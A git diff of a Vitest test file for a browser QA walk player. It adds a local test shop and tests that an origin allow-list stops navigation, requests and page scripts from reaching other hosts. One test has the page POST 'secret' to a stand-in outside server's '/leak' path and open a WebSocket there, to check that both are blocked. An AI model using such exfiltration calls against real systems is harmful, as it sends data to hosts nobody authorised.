@@ -4,6 +4,7 @@ import { tmpdir } from "node:os";
 import { join } from "node:path";
 import { afterAll, beforeAll, describe, expect, it } from "vitest";
 import { loadPlaywright, type Playwright } from "../shared/browser/playwright.ts";
+import { originPolicy } from "./qa-origins.ts";
 import { parseWalk, type Walk } from "./qa-walk.ts";
 import { playWalk, reason } from "./qa-walker.ts";
 
@@ -12,6 +13,7 @@ import { playWalk, reason } from "./qa-walker.ts";
 /** A tiny shop for walks to run against: a page that adds to a cart, a disabled button, a link. */
 const PAGE = `<!doctype html><title>Shop</title><h1>Shop</h1><p id="count">0 in cart</p>
 <button onclick="add()">Add</button><button disabled>Pay</button><a href="/next">Next</a>
+<button onclick="this.disabled = true; fetch('/orders', { method: 'POST' })">Order</button>
 <script>
 localStorage.setItem("cartId", "cart-42");
 async function add() {
@@ -23,35 +25,58 @@ async function add() {
 </script>`;
 
 /** Starts the shop on a free port; every start has an empty cart. */
-async function startShop(): Promise<{ url: string; close: () => void }> {
+async function startShop(): Promise<{ url: string; close: () => void; hits: () => number }> {
   let items = 0;
-  const server = createServer((req, res) => {
-    if (req.url === "/items" && req.method === "POST") {
-      items++;
-      return res.writeHead(200, { "content-type": "application/json" }).end(`{"count":${items}}`);
-    }
-    if (req.url === "/items/cart-42" && req.method === "DELETE") {
+  let hits = 0;
+  const html = { "content-type": "text/html" };
+  const poll = "<p>Polling</p><script>setInterval(() => fetch('/tick'), 150)</script>";
+  // What the shop answers, by method and path: [status, headers, body].
+  const routes: Record<string, () => [number, Record<string, string>, string]> = {
+    "GET /": () => [200, html, PAGE],
+    "GET /next": () => [200, html, PAGE],
+    "GET /poll": () => [200, html, poll],
+    "GET /tick": () => [200, {}, "tick"],
+    "POST /orders": () => [201, {}, ""],
+    "POST /items": () => [200, { "content-type": "application/json" }, `{"count":${++items}}`],
+    "DELETE /items/cart-42": () => {
       items = 0;
-      return res.writeHead(204).end();
-    }
-    if (req.url === "/" || req.url === "/next")
-      return res.writeHead(200, { "content-type": "text/html" }).end(PAGE);
-    res.writeHead(404).end("not found");
+      return [204, {}, ""];
+    },
+  };
+  const server = createServer((req, res) => {
+    hits++;
+    const route = routes[`${req.method} ${req.url}`];
+    const [status, headers, body] = route ? route() : [404, {}, "not found"];
+    res.writeHead(status, headers).end(body);
+  });
+  server.on("upgrade", (_, socket) => {
+    hits++;
+    socket.destroy();
   });
   await new Promise<void>((resolve) => server.listen(0, "127.0.0.1", resolve));
   const address = server.address();
   const port = typeof address === "object" && address ? address.port : 0;
-  return { url: `http://127.0.0.1:${port}`, close: () => server.close() };
+  return { url: `http://127.0.0.1:${port}`, close: () => server.close(), hits: () => hits };
 }
 
 const playwright = loadPlaywright(process.cwd());
 
 let shop: Awaited<ReturnType<typeof startShop>>;
+/** Another server on this machine, standing for a host the walk must not reach. */
+let outside: Awaited<ReturnType<typeof startShop>>;
 
 beforeAll(async () => {
   shop = await startShop();
+  outside = await startShop();
 });
-afterAll(() => shop.close());
+afterAll(() => {
+  shop.close();
+  outside.close();
+});
+
+/** This machine, the default of `qa.origins`. */
+const local = originPolicy(["local"]);
+const folder = () => mkdtempSync(join(tmpdir(), "aidt-walk-"));
 
 function walkOf(steps: object[]): Walk {
   const parsed = parseWalk({
@@ -88,6 +113,7 @@ describe("playWalk", () => {
           { keep: { left: "String(localStorage.length)" } },
         ]),
         out,
+        local,
       );
       expect(log.stopped).toBe(false);
       const step = (n: number) => log.steps[n - 1];
@@ -100,7 +126,8 @@ describe("playWalk", () => {
       expect(step(4)?.text).toContain("2 in cart");
       expect(readFileSync(join(out, "04-shopper.txt"), "utf8")).toContain("2 in cart");
       expect(existsSync(join(out, "04-shopper.png"))).toBe(true);
-      expect(step(5)).toMatchObject({ person: "intruder", answer: "204" });
+      expect(step(5)?.person).toBe("intruder");
+      expect(step(5)?.calls).toEqual([{ method: "DELETE", path: "/items/cart-42", status: 204 }]);
       expect(step(6)).toMatchObject({ person: "intruder" });
       expect(step(7)).toMatchObject({ person: "shopper" });
       expect(step(6)?.calls).toEqual([{ method: "GET", path: "/missing", status: 404 }]);
@@ -122,6 +149,7 @@ describe("playWalk", () => {
         playwright as Playwright,
         walkOf([{ go: "/" }, { click: "Pay" }, { go: "/" }]),
         out,
+        local,
       );
       expect(log.stopped).toBe(true);
       expect(log.steps).toHaveLength(2);
@@ -144,10 +172,11 @@ describe("playWalk", () => {
           { as: "intruder", reload: true },
         ]),
         out,
+        local,
       );
       expect(log.steps[1]).toMatchObject({
         person: "intruder",
-        answer: expect.stringMatching(/^200/),
+        calls: [{ method: "GET", path: "/", status: 200 }],
       });
       expect(log.steps[2]?.failure).toBe(
         "intruder has no page open yet: their first step on a page is a go",
@@ -161,9 +190,128 @@ describe("playWalk", () => {
       playwright as Playwright,
       walkOf([{ request: { method: "DELETE", path: "/items/{cart}" } }]),
       out,
+      local,
     );
     expect(log.steps[0]?.failure).toBe("nothing was kept as {cart} before this step");
   });
+});
+
+describe("playWalk, as a person would do it", () => {
+  it.skipIf(!playwright)(
+    "a double tap is two quick clicks: a button that disables itself takes one",
+    async () => {
+      const log = await playWalk(
+        playwright as Playwright,
+        walkOf([{ go: "/" }, { click: "Order", times: 2 }]),
+        folder(),
+        local,
+      );
+      expect(log.steps[1]?.calls).toEqual([{ method: "POST", path: "/orders", status: 201 }]);
+    },
+  );
+
+  it.skipIf(!playwright)(
+    "fills {names} in any text of a step, and never keeps an empty value",
+    async () => {
+      const log = await playWalk(
+        playwright as Playwright,
+        walkOf([
+          { go: "/" },
+          { keep: { label: "document.querySelector('button').textContent" } },
+          { click: "{label}" },
+          { keep: { empty: "''" } },
+        ]),
+        folder(),
+        local,
+      );
+      expect(log.steps[2]?.calls).toEqual([{ method: "POST", path: "/items", status: 200 }]);
+      expect(log.steps[3]?.failure).toBe("`''` gave nothing");
+    },
+  );
+
+  it.skipIf(!playwright)(
+    "offline, a person's own calls fail too, and never reach the app",
+    async () => {
+      const before = shop.hits();
+      const log = await playWalk(
+        playwright as Playwright,
+        walkOf([{ offline: true }, { request: { method: "POST", path: "/orders" } }]),
+        folder(),
+        local,
+      );
+      expect(log.steps[1]?.calls).toEqual([
+        { method: "POST", path: "/orders", status: "net::ERR_INTERNET_DISCONNECTED" },
+      ]);
+      expect(shop.hits()).toBe(before);
+    },
+  );
+
+  it.skipIf(!playwright)(
+    "names the person whose page made a call during someone else's step",
+    async () => {
+      const log = await playWalk(
+        playwright as Playwright,
+        walkOf([{ go: "/poll" }, { as: "intruder", go: "/" }, { as: "intruder", wait: 600 }]),
+        folder(),
+        local,
+      );
+      expect(log.steps[2]?.calls).toContainEqual({
+        method: "GET",
+        path: "/tick",
+        status: 200,
+        person: "shopper",
+      });
+    },
+  );
+});
+
+describe("playWalk reaches only what qa.origins allows", () => {
+  const onlyTheShop = () => originPolicy([shop.url]);
+
+  it.skipIf(!playwright)("stops a go or a request to anywhere else", async () => {
+    for (const step of [
+      { go: `${outside.url}/` },
+      { request: { method: "POST", path: `${outside.url}/x` } },
+    ]) {
+      const before = outside.hits();
+      const log = await playWalk(playwright as Playwright, walkOf([step]), folder(), onlyTheShop());
+      expect(log.stopped).toBe(true);
+      expect(log.steps[0]?.failure).toBe(
+        `${outside.url}/${"go" in step ? "" : "x"} is outside qa.origins: a walk reaches this machine, or what the config lists`,
+      );
+      expect(outside.hits()).toBe(before);
+    }
+  });
+
+  it.skipIf(!playwright)(
+    "blocks the page's own calls and sockets to anywhere else, and logs them",
+    async () => {
+      const before = outside.hits();
+      const ws = outside.url.replace("http", "ws");
+      const log = await playWalk(
+        playwright as Playwright,
+        walkOf([
+          { go: "/" },
+          {
+            keep: {
+              sent: `fetch("${outside.url}/leak", { method: "POST", body: "secret" }).then(() => "sent", () => "blocked")`,
+              socket: `new Promise((done) => { const s = new WebSocket("${ws}/leak"); s.onopen = () => done("open"); s.onclose = () => done("closed"); })`,
+            },
+          },
+          { reload: true },
+        ]),
+        folder(),
+        onlyTheShop(),
+      );
+      expect(log.steps[1]?.answer).toBe('sent = "blocked" · socket = "closed"');
+      expect(log.steps.flatMap((s) => s.calls)).toContainEqual({
+        method: "POST",
+        path: `${outside.url}/leak`,
+        status: "blocked: outside qa.origins",
+      });
+      expect(outside.hits()).toBe(before);
+    },
+  );
 });
 
 describe("reason", () => {
